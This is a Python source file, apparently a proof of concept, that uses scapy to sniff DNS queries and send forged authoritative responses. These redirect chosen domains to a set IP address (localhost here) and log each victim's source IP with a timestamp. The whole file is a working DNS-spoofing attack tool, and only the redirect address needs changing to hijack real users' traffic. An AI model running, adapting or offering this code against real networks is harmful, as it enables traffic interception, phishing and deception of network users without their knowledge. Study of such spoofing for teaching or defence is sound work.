import json
import time

from pathlib import Path
from typing import Dict, TypedDict, Any
from scapy.layers.dns import DNS
from scapy.all import *  # type: ignore

from data.data_helper import record_entry
from mapper import ClientMapper


class UrlMapType(TypedDict):
    """Type definition for URL mapping dictionary."""
    Fake: str
    Real: str

def load_urls() -> Dict[str, str]:
    """
    Input: None
    Output: Dict[str, str] - Dictionary mapping fake URLs to real URLs
    Purpose: Load URL mappings from configuration file
    Description: Attempts to load URL mappings from urls.json, falls back to default values if file not found
    """
    try:
        with open('urls.json', 'r') as file:
            return json.load(file)
    except Exception as e:
        return {
            'www.techinginfo.com': 'www.chess.com',
            'www.shopconvet.com': 'www.ynet.co.il'
        }

# Configuration
URLS = load_urls()
SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
MAPPER = ClientMapper(dns_process=True)

def dns_spoof(pkt: Any) -> None:
    """
    Input: pkt (Any) - Captured network packet
    Output: None
    Purpose: Handle DNS spoofing for specific domain requests
    Description: Analyzes DNS queries and sends spoofed responses for targeted domains,
                recording the attempt and mapping client information
    """
    # Check if packet is a DNS query
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # type: ignore
        qname = pkt[DNSQR].qname.decode().rstrip(".")  # type: ignore
        if qname in URLS.keys():
            srcip = pkt[IP].src  # type: ignore

            # Craft spoofed DNS response
            spoofed_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # type: ignore
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /  # type: ignore
                DNS(  # type: ignore
                    id=pkt[DNS].id,  # Match query ID
                    qr=1,            # Response flag
                    aa=1,            # Authoritative answer
                    qd=pkt[DNS].qd,  # Copy query section
                    an=DNSRR(rrname=qname, type="A", ttl=300, rdata=SPOOF_IP)  # type: ignore
                )
            )

            # Send spoofed response
            for _ in range(5):
                sendp(spoofed_pkt, verbose=0)
                time.sleep(0.1)
            print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
            record_entry(qname, build_dict_from_packet(pkt))
            MAPPER.add_client(srcip, URLS[qname])  # type: ignore

def build_dict_from_packet(pkt: Any) -> Dict[str, str]:
    """
    Input: pkt (Any) - Network packet to extract information from
    Output: Dict[str, str] - Dictionary containing packet information
    Purpose: Extract relevant information from packet
    Description: Creates a dictionary with source IP and timestamp from the packet
    """
    return {
        "IP": pkt[IP].src,  # type: ignore
        "Time": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    }

if __name__ == "__main__":
    # Sniff DNS packets
    print(f"Sniffing DNS queries for {URLS}...")
    while True:
        # Update sniffing list every 5 seconds
        
        sniff(filter="udp port 53", prn=dns_spoof, store=0,timeout=5)
        load_urls()
